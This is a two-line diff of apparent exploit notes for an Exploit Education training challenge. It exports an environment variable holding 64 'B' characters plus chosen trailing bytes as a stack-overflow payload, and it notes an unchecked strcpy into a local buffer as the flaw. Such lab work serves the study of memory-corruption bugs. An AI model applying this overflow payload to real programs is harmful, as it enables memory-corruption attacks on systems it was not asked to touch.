@@ -1,0 +1,2 @@
+export ExploitEducation=$(printf "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB\x0a\x09\x0a\x0d")
+exploit : strcpy(locals.buffer, ptr); -> buffer overflow
